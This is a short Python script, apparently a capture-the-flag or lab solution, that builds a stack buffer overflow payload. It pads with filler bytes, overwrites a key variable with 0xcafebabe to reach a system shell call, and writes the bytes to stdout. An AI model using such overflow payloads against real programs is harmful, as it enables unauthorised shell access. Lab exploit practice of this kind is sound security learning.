 # 65d:	c7 04 24 9b 07 00 00 	movl   $0x79b,(%esp) // we want to return into 
#0x56555664 system shell call
import sys
payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF"
# overwrite the key value with 0xcafebabe (little endian)
payload += b"\xca\xfe\xba\xbe" [::-1]
sys.stdout.buffer.write(payload)








